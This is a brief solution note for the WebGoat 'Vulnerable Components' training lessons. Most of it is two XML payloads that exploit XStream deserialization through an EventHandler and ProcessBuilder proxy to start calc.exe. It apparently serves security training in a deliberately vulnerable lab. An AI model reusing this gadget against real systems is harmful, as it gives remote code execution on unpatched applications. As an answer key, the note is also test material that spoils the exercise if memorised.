# Vulnerable Components
### 5
Simply try.

### 12 
DOES NOT WORK in WebGoat 8.2 (https://github.com/WebGoat/WebGoat/issues/1134)

but this should work:
<contact class='dynamic-proxy'>
  <interface>org.owasp.webgoat.vulnerable_components.Contact</interface>
  <handler class='java.beans.EventHandler'>
    <target class='java.lang.ProcessBuilder'>
      <command>
        <string>calc.exe</string>
      </command>
    </target>
    <action>start</action>
  </handler>
</contact>

or this:
<contact class='org.owasp.webgoat.vulnerable_components.Contact'>
  <handler class='java.beans.EventHandler'>
    <target class='java.lang.ProcessBuilder'>
      <command>
        <string>calc.exe</string>
      </command>
    </target>
    <action>start</action>
  </handler>
</contact>
